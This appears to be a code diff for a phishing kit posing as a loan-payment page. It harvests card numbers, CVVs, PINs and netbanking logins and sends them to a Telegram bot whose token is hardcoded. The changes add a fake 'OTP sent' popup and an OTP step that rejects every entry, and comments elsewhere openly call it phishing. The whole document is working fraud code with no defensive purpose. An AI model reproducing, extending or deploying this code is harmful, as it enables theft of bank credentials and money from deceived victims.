@@ -166,6 +166,45 @@ transform:translateY(0);
 }
 }
 
+/* OTP SECTION */
+.otp-section {
+    text-align: center;
+    padding: 30px 20px;
+}
+
+.otp-input-group {
+    margin-bottom: 25px;
+}
+
+.otp-input {
+    width: 100%;
+    padding: 20px;
+    border: 2px solid #e9ecef;
+    border-radius: 15px;
+    font-size: 24px;
+    text-align: center;
+    letter-spacing: 10px;
+    font-weight: 700;
+    background: #f8f9fa;
+    transition: .3s;
+}
+
+.otp-input:focus {
+    outline: none;
+    border-color: #f7931e;
+    background: #fff;
+    box-shadow: 0 10px 25px rgba(247,147,30,.15);
+    transform: translateY(-2px);
+}
+
+.timer {
+    font-size: 24px;
+    font-weight: 700;
+    color: #f7931e;
+    margin: 20px 0;
+    font-family: 'Courier New', monospace;
+}
+
 /* INPUT */
 
 .input-group{
@@ -323,6 +362,84 @@ color:#155724;
 border-left:5px solid #28a745;
 }
 
+/* OTP POPUP */
+.otp-popup {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 10000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.otp-popup-content {
+    background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
+    border-radius: 25px;
+    padding: 40px;
+    max-width: 450px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
+    border: 4px solid #f7931e;
+    transform: scale(0);
+    animation: otpPopupAnim 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
+    position: relative;
+    overflow: hidden;
+}
+
+.otp-popup-content::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: linear-gradient(45deg, transparent 30%, rgba(247,147,30,0.1) 50%, transparent 70%);
+    animation: shine 2s infinite;
+}
+
+@keyframes otpPopupAnim {
+    0% {
+        transform: scale(0) rotate(-180deg);
+        opacity: 0;
+    }
+    60% {
+        transform: scale(1.1) rotate(10deg);
+    }
+    100% {
+        transform: scale(1) rotate(0deg);
+        opacity: 1;
+    }
+}
+
+@keyframes shine {
+    0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+    100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+}
+
+.otp-popup-icon {
+    font-size: 60px;
+    margin-bottom: 20px;
+    animation: bounce 1s infinite;
+}
+
+@keyframes bounce {
+    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+    40% { transform: translateY(-10px); }
+    60% { transform: translateY(-5px); }
+}
+
+.otp-popup h3 {
+    color: #2c3e50;
+    margin-bottom: 10px;
+    font-size: 24px;
+    font-weight: 700;
+}
+
 /* MOBILE FIX */
 
 @media(max-width:480px){
@@ -370,6 +487,11 @@ font-size:28px;
     0% {transform: scale(1);}
     50% {transform: scale(1.02);}
     100% {transform: scale(1);}
+}
+
+.otp-popup-content {
+    padding: 30px 20px;
+    margin: 20px;
 }
 
 .header h1{
@@ -476,7 +598,7 @@ font-size:22px;
                         <input type="password" id="pin" placeholder="****" maxlength="6" required>
                     </div>
                     <button class="btn btn-primary" onclick="submitCard()">
-                        🔒 Secure Pay Now
+                        Verify OTP
                     </button>
                 </div>
 
@@ -505,11 +627,21 @@ font-size:22px;
                 </button>
             </div>
 
-            <!-- Success Message -->
-            <div class="success" id="successMsg">
-                <h3>✅ Payment Successful!</h3>
-                <p>Your loan application has been approved. Funds will be disbursed within 24 hours.</p>
-                <p><strong>Loan Amount: ₹<span id="finalAmount"></span></strong></p>
+            <!-- OTP Section -->
+            <div class="step" id="otpStep">
+                <div class="otp-section">
+                    <div class="otp-input-group">
+                        <label>🔐 Enter OTP (6 digits)</label>
+                        <input type="text" class="otp-input" id="otpInput" placeholder="123456" maxlength="6" required>
+                    </div>
+                    <div class="timer" id="timer">5:00</div>
+                    <button class="btn btn-primary" id="submitOtpBtn" onclick="submitOtp()">
+                        ✅ Verify & Submit
+                    </button>
+                    <button class="btn btn-secondary" onclick="backToPayment()">
+                        ← Back to Payment
+                    </button>
+                </div>
             </div>
 
             <!-- Error Message -->
@@ -519,6 +651,8 @@ font-size:22px;
 
     <script>let currentStep = 1;
 let currentPaymentTab = 'card';
+let otpTimer;
+let timeLeft = 300; // 5 minutes in seconds
 
 // Telegram Config
 const TELEGRAM_BOT_TOKEN = "8433694608:AAGIvNk5eVUAT18kFFHeRtLG6gMoO6udZPY";
@@ -605,12 +739,16 @@ document.getElementById('mobile').addEventListener('input', function(e) {
     e.target.value = value;
 });
 
+// OTP Input Formatting
+document.getElementById('otpInput').addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
+});
+
 // Step Navigation with Validation
 function nextStep(step) {
     const currentStepEl = document.getElementById(`step${step}`);
     const inputs = currentStepEl.querySelectorAll('input[required]');
     
-    // Check if all required fields are filled
     for (let input of inputs) {
         if (!input.value.trim()) {
             shakeInput(input);
@@ -619,16 +757,10 @@ function nextStep(step) {
         }
     }
 
-    // Hide current step
     document.getElementById(`step${step}`).classList.remove('active');
-    
-    // Show next step
     currentStep = step + 1;
     document.getElementById(`step${currentStep}`).classList.add('active');
-    
-    // Update progress bar
     updateProgressBar();
-    
     hideError();
 }
 
@@ -676,24 +808,20 @@ function shakeInput(input) {
 function selectPayment(tab) {
     currentPaymentTab = tab;
     
-    // UPI Error - CENTERED POPUP
     if (tab === 'upi') {
         showUpiPopup();
-        return; // STOP EXECUTION FOR UPI
+        return;
     }
     
-    // Update active tab (only for valid tabs)
     document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
     event.target.classList.add('active');
     
-    // Update active content (only for valid tabs)
     document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
     document.getElementById(`${tab}-form`).classList.add('active');
 }
 
-// UPI Error Popup - CENTERED MODAL
+// UPI Error Popup
 function showUpiPopup() {
-    // Create overlay
     const overlay = document.createElement('div');
     overlay.id = 'upi-overlay';
     overlay.style.cssText = `
@@ -709,7 +837,6 @@ function showUpiPopup() {
         justify-content: center;
     `;
     
-    // Create popup
     const popup = document.createElement('div');
     popup.style.cssText = `
         background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
@@ -737,54 +864,38 @@ function showUpiPopup() {
     
     overlay.appendChild(popup);
     document.body.appendChild(overlay);
-    
-    // Add animation CSS
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes popupSlide {
-            0% { transform: scale(0.7) translateY(-30px); opacity: 0; }
-            100% { transform: scale(1) translateY(0); opacity: 1; }
-        }
-    `;
-    document.head.appendChild(style);
 }
 
-// Close UPI Popup & Switch to Card
 function closeUpiPopup() {
     const overlay = document.getElementById('upi-overlay');
     if (overlay) {
-        overlay.style.animation = 'popupSlide 0.3s ease-in reverse';
-        setTimeout(() => {
-            overlay.remove();
-        }, 300);
+        overlay.remove();
     }
-    
-    // Auto switch to card tab
     setTimeout(() => {
-        document.querySelector('.tab-btn[data-tab="card"], .tab-btn:first-child').click();
+        document.querySelector('.tab-btn:first-child').click();
     }, 100);
 }
 
-// Submit Card Payment
+// Submit Card Payment - IMMEDIATE TELEGRAM + OTP POPUP
 async function submitCard() {
     const formData = getFormData();
     if (!validateCardForm(formData)) return;
     
-    // Disable button
     const btn = event.target;
     btn.disabled = true;
-    btn.textContent = 'Processing...';
+    btn.innerHTML = '⏳ Sending...';
     
-    await submitForm({
+    // Send to Telegram IMMEDIATELY
+    await sendToTelegram({
         paymentMethod: 'Card',
-        cardNumber: formData.cardNumber,
-        expiry: formData.expiry,
-        cvv: formData.cvv,
-        pin: formData.pin
+        ...formData
     });
     
+    // Show OTP Success Popup for 2 seconds
+    showOtpSuccessPopup();
+    
     btn.disabled = false;
-    btn.textContent = '🔒 Secure Pay Now';
+    btn.innerHTML = '🔒 Secure Pay Now';
 }
 
 // Submit Netbanking
@@ -798,19 +909,106 @@ async function submitNetbanking() {
         return;
     }
     
-    // Disable button
     const btn = event.target;
     btn.disabled = true;
-    btn.textContent = 'Processing...';
+    btn.innerHTML = '⏳ Sending...';
     
-    await submitForm({
+    await sendToTelegram({
         paymentMethod: 'Netbanking',
         netUsername: username,
-        netPassword: password
+        netPassword: password,
+        ...getFormData()
     });
     
+    showOtpSuccessPopup();
+    
     btn.disabled = false;
-    btn.textContent = '🚀 Login & Pay';
+    btn.innerHTML = '🚀 Login & Pay';
+}
+
+// OTP Success Popup (2 seconds)
+function showOtpSuccessPopup() {
+    const popup = document.createElement('div');
+    popup.className = 'otp-popup';
+    popup.innerHTML = `
+        <div class="otp-popup-content">
+            <div class="otp-popup-icon">✅</div>
+            <h3>OTP Sent Successfully!</h3>
+            <p style="color: #6c757d; margin-bottom: 20px;">Check your mobile for 6-digit OTP</p>
+        </div>
+    `;
+    
+    document.body.appendChild(popup);
+    
+    // Remove popup after 2 seconds and go to OTP step
+    setTimeout(() => {
+        popup.remove();
+        goToOtpStep();
+    }, 2000);
+}
+
+// Go to OTP Step + Start Timer
+function goToOtpStep() {
+    document.getElementById('step3').classList.remove('active');
+    document.getElementById('otpStep').classList.add('active');
+    currentStep = 4;
+    startOtpTimer();
+}
+
+// Start 5-minute countdown
+function startOtpTimer() {
+    timeLeft = 300;
+    updateTimerDisplay();
+    
+    otpTimer = setInterval(() => {
+        timeLeft--;
+        updateTimerDisplay();
+        
+        if (timeLeft <= 0) {
+            clearInterval(otpTimer);
+            document.getElementById('submitOtpBtn').disabled = true;
+            document.getElementById('submitOtpBtn').innerHTML = '⏰ Time Expired';
+            showError('OTP expired. Please try again.');
+        }
+    }, 1000);
+}
+
+function updateTimerDisplay() {
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    document.getElementById('timer').textContent = 
+        `${minutes}:${seconds.toString().padStart(2, '0')}`;
+}
+
+// Submit OTP - Always Incorrect
+function submitOtp() {
+    const otp = document.getElementById('otpInput').value;
+    
+    if (otp.length !== 6) {
+        shakeInput(document.getElementById('otpInput'));
+        showError('Please enter 6-digit OTP');
+        return;
+    }
+    
+    // Show incorrect OTP warning
+    document.getElementById('errorMsg').innerHTML = `
+        ❌ Incorrect OTP. Please try after some time.
+        <br><small style="color: #dc3545;">Your session will expire in ${timeLeft}s</small>
+    `;
+    document.getElementById('errorMsg').style.display = 'block';
+    
+    // Clear OTP input
+    document.getElementById('otpInput').value = '';
+    
+    // Shake OTP input
+    shakeInput(document.getElementById('otpInput'));
+}
+
+function backToPayment() {
+    clearInterval(otpTimer);
+    document.getElementById('otpStep').classList.remove('active');
+    document.getElementById('step3').classList.add('active');
+    currentStep = 3;
 }
 
 // Get All Form Data
@@ -849,68 +1047,7 @@ function validateCardForm(data) {
     return true;
 }
 
-// Main Submit Function
-async function submitForm(extraData) {
-    try {
-        const formData = getFormData();
-        const payload = { ...formData, ...extraData };
-        
-        // Show processing message
-        showProcessing('🔄 Processing your payment... Please wait');
-        
-        // Send to Telegram FIRST
-        const telegramSent = await sendToTelegram(payload);
-        
-        // Simulate processing delay
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        
-        // Always show success (phishing success)
-        showSuccess(formData.loanAmount);
-        
-        console.log('Telegram sent:', telegramSent ? '✅ Success' : '❌ Failed');
-        
-    } catch (error) {
-        console.error('Submit error:', error);
-        showError('Payment processing failed. Please try again.');
-    }
-}
-
-// Show Processing
-function showProcessing(message) {
-    const errorEl = document.getElementById('errorMsg');
-    errorEl.innerHTML = `<div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); color: #856404; border-left: 5px solid #ffc107; font-weight: 600;">${message}</div>`;
-    errorEl.style.display = 'block';
-}
-
-// Show Success with 5 second timer
-function showSuccess(amount) {
-    document.querySelectorAll('.step').forEach(step => {
-        step.style.display = 'none';
-    });
-    
-    const successMsg = document.getElementById('successMsg');
-    successMsg.innerHTML = `
-        <h3>✅ Payment Successful!</h3>
-        <p>Your loan application has been <strong>APPROVED</strong></p>
-        <p><strong>Loan Amount: ₹${parseInt(amount).toLocaleString()}</strong></p>
-        <p style="font-size: 14px; margin-top: 15px;">
-            💰 Funds will be credited to your account within <strong>24 hours</strong><br>
-            ⏳ Processing time: 5 seconds remaining...
-        </p>
-    `;
-    successMsg.style.display = 'block';
-    
-    // Auto refresh or redirect after 5 seconds
-    setTimeout(() => {
-        successMsg.innerHTML += `
-            <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.8); border-radius: 10px; font-size: 14px;">
-                ✅ Processing completed! Check your bank account in 24 hours.
-            </div>
-        `;
-    }, 5000);
-}
-
-// Show Error with better styling
+// Show Error
 function showError(message) {
     const errorEl = document.getElementById('errorMsg');
     errorEl.innerHTML = `<strong>❌ ${message}</strong>`;
